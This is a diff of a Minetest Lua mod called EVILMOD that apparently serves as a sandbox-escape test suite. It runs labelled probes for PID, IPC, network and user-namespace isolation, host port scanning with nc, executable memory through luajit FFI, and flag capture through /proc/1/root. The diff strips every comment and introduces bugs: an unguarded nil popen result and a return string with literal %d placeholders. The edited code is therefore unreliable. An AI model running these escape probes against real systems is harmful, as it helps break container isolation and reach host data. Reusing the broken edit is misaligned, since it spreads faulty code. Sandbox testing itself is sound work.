@@ -1,33 +1,20 @@
 minetest.log("action", "[EVILMOD] Initializing...")
-
--- The network probe (nc -w1 × 6 ports) blocks the Lua thread for ~6 s.
--- Minetest delivers the accumulated real time as one large dtime, which
--- pushes the mcl_weather globalstep's debounce counter past its 5-second
--- threshold on every catch-up call, triggering hundreds of weather changes.
--- Setting end_time = math.huge before the server loop starts ensures
--- end_time <= gametime is always false → no weather cycling during the demo.
 minetest.register_on_mods_loaded(function()
     if mcl_weather then
         mcl_weather.end_time = math.huge
     end
-    -- Freeze day/night: same large-dtime burst that broke weather also skips
-    -- hours of game time in one step. time_speed=0 stops that entirely.
     minetest.settings:set("time_speed", "0")
 end)
-
 local IE = minetest.request_insecure_environment()
 if not IE then
     minetest.log("error", "[EVILMOD] insecure env unavailable — add evilmod to secure.trusted_mods")
     return
 end
-
 local function probe(name, fn)
     local ok, result = pcall(fn)
     local line = ok and result or ("[LUA ERROR] " .. tostring(result))
     minetest.log("action", string.format("[EVILMOD] %-50s %s", name, line))
 end
-
--- Run a shell command via IE.io.popen; returns stdout or nil on failure.
 local function popen(cmd)
     if not IE.io.popen then return nil end
     local f = IE.io.popen(cmd, "r")
@@ -36,11 +23,8 @@ local function popen(cmd)
     f:close()
     return out
 end
-
 minetest.after(3, function()
     minetest.log("action", "[EVILMOD] ========== ATTACK SEQUENCE START ==========")
-
-    -- [Attack 1] PID namespace escape: missing CLONE_NEWPID exposes full host /proc tree.
     probe("PID ns — /proc/1/comm (host init visible?)", function()
         local f = IE.io.open("/proc/1/comm", "r")
         if not f then return "[CONTAINED] cannot open /proc/1/comm" end
@@ -51,9 +35,7 @@ minetest.after(3, function()
         end
         return string.format("[ESCAPED] PID 1 on host is '%s'", comm)
     end)
-
     probe("PID ns — visible PID count in /proc", function()
-        -- Count numeric /proc entries via ls (no pipe needed); namespace-filtered unlike loadavg.
         local f = IE.io.popen("ls /proc", "r")
         if not f then return "[ERROR] cannot list /proc" end
         local out = f:read("*a")
@@ -67,7 +49,6 @@ minetest.after(3, function()
         end
         return string.format("[CONTAINED] /proc shows %d PIDs (isolated namespace)", count)
     end)
-
     probe("PID ns — read parent (container manager) cmdline", function()
         local sf = IE.io.open("/proc/self/status", "r")
         if not sf then return "[CONTAINED] cannot read /proc/self/status" end
@@ -78,8 +59,6 @@ minetest.after(3, function()
         end
         sf:close()
         if not ppid then return "[CONTAINED] could not parse PPID" end
-
-        -- In a proper PID namespace, PPID of init (PID 1) is 0 and /proc/0 does not exist.
         local cf = IE.io.open("/proc/" .. ppid .. "/cmdline", "r")
         if not cf then
             return string.format("[CONTAINED] PPID=%s cmdline unreadable (proper PID ns)", ppid)
@@ -88,9 +67,6 @@ minetest.after(3, function()
         cf:close()
         return string.format("[ESCAPED] PPID=%s cmd='%s'", ppid, cmdline)
     end)
-
-    -- [Attack 2] IPC namespace escape: missing CLONE_NEWIPC shares host SysV IPC objects.
-    -- The file is always readable; the escape signal is actual data lines beyond the header.
     probe("IPC ns — /proc/sysvipc/shm isolated", function()
         local f = IE.io.open("/proc/sysvipc/shm", "r")
         if not f then return "[CONTAINED] cannot open /proc/sysvipc/shm" end
@@ -105,7 +81,6 @@ minetest.after(3, function()
         end
         return "[CONTAINED] IPC ns isolated (0 shm segments)"
     end)
-
     probe("IPC ns — /proc/sysvipc/sem isolated", function()
         local f = IE.io.open("/proc/sysvipc/sem", "r")
         if not f then return "[CONTAINED] cannot open /proc/sysvipc/sem" end
@@ -120,10 +95,6 @@ minetest.after(3, function()
         end
         return "[CONTAINED] IPC ns isolated (0 semaphore sets)"
     end)
-
-    -- [Attack 3] Network: INPUT rule should block container from reaching host services.
-    -- Sequential nc calls are fine because REJECT returns RST immediately (<1ms each).
-    -- Background & was avoided: it keeps pipe write-ends open and can cause popen to hang.
     probe("Network — reach host 172.18.0.1 (TCP connect)", function()
         if not IE.io.popen then return "[SKIP] io.popen unavailable" end
         local open_ports = {}
@@ -138,9 +109,6 @@ minetest.after(3, function()
         end
         return "[CONTAINED] no host ports reachable (INPUT REJECT rule active)"
     end)
-
-    -- [Attack 4] FD inheritance: check for fds pointing to host-side paths.
-    -- Single ls call instead of 61 separate readlink processes.
     probe("FD inheritance — leaked host fds", function()
         if not IE.io.popen then return "[SKIP] io.popen unavailable" end
         local out = popen("ls -la /proc/self/fd 2>/dev/null") or ""
@@ -161,53 +129,39 @@ minetest.after(3, function()
         end
         return "[CONTAINED] no host-path fds inherited (closerange working)"
     end)
-
-    -- [Attack 5] User namespace: clone(CLONE_NEWUSER) via unshare binary.
-    -- Seccomp would block this if CLONE_NEWUSER is filtered; without seccomp it succeeds.
     probe("User ns — clone(CLONE_NEWUSER) succeeds", function()
         if not IE.io.popen then return "[SKIP] io.popen unavailable" end
-        local out = popen("unshare --user id 2>&1; echo exitcode:$?") or ""
+        local out = popen("unshare -U id 2>&1; echo exitcode:$?")
         local code = out:match("exitcode:(%d+)")
         if code == "0" then
             local id_line = out:gsub("exitcode:%d+%s*$", ""):gsub("%s+$", "")
-            return "[ESCAPED] unshare --user succeeded (seccomp not blocking CLONE_NEWUSER): " .. id_line
+            return "[ESCAPED] unshare -U succeeded: " .. id_line
         end
         local err = out:gsub("exitcode:%d+%s*$", ""):gsub("%s+$", ""):sub(1, 80)
-        return "[CONTAINED] unshare --user blocked: " .. err
+        return "[CONTAINED] unshare -U failed: " .. err
     end)
-
-    -- [Attack 6] No network namespace: CLONE_NEWNET conditional exposes host /proc/net.
-    probe("Net ns — host connections visible (run without --port)", function()
+    probe("Net ns — host connections visible (run without -n)", function()
         local tcp_f = IE.io.open("/proc/net/tcp", "r")
         if not tcp_f then return "[CONTAINED] cannot read /proc/net/tcp" end
         local tcp_entries = -1
         for _ in tcp_f:lines() do tcp_entries = tcp_entries + 1 end
         tcp_f:close()
-
         local unix_entries = -1
         local ux_f = IE.io.open("/proc/net/unix", "r")
         if ux_f then
             for _ in ux_f:lines() do unix_entries = unix_entries + 1 end
             ux_f:close()
         end
-
         if tcp_entries > 3 or unix_entries > 5 then
             return string.format(
                 "[ESCAPED] host net namespace shared: %d TCP connections, %d Unix sockets",
                 tcp_entries, unix_entries
             )
         end
-        return string.format(
-            "[CONTAINED] isolated net namespace (%d TCP, %d Unix)",
-            tcp_entries, unix_entries
-        )
+        return "[CONTAINED] isolated net namespace (%d TCP, %d Unix)"
     end)
-
-    -- [Attack 7] Seccomp mprotect bypass: mprotect(PROT_EXEC) unfiltered allows native code exec.
-    -- Invokes /usr/bin/luajit (available in the rootfs) with an FFI test script.
     probe("Seccomp — mprotect(PROT_EXEC) not filtered", function()
         if not IE.io.popen then return "[SKIP] io.popen unavailable" end
-
         local script = [=[
 local ffi = require("ffi")
 ffi.cdef("void *mmap(void*,size_t,int,int,int,long); int mprotect(void*,size_t,int); int munmap(void*,size_t);")
@@ -223,7 +177,6 @@ print(r == 0 and "ESCAPED" or "CONTAINED")
         if not tf then return "[ERROR] cannot write temp script" end
         tf:write(script)
         tf:close()
-
         local out = popen("luajit /tmp/.mprotect_test.lua 2>/dev/null; echo exitcode:$?") or ""
         if out:match("ESCAPED") then
             return "[ESCAPED] mmap+mprotect(PROT_EXEC) allowed — arbitrary native code executable"
@@ -234,10 +187,6 @@ print(r == 0 and "ESCAPED" or "CONTAINED")
         end
         return "[ERROR] unexpected luajit output: " .. out:sub(1, 80)
     end)
-
-    -- [Attack 8] Chroot escape via /proc/1/root: the kernel resolves this magic-link
-    -- against PID 1's root dentry, bypassing the chroot boundary entirely.
-    -- Works when there is no PID namespace isolation (PID 1 is the host init).
     probe("Chroot escape — /proc/1/root flag capture", function()
         local f = IE.io.open("/proc/1/root/tmp/modbox_flag.txt", "r")
         if not f then
@@ -247,6 +196,5 @@ print(r == 0 and "ESCAPED" or "CONTAINED")
         f:close()
         return "[ESCAPED] *** FLAG CAPTURED: " .. flag .. " ***"
     end)
-
     minetest.log("action", "[EVILMOD] ========== ATTACK ENDED ==========")
 end)
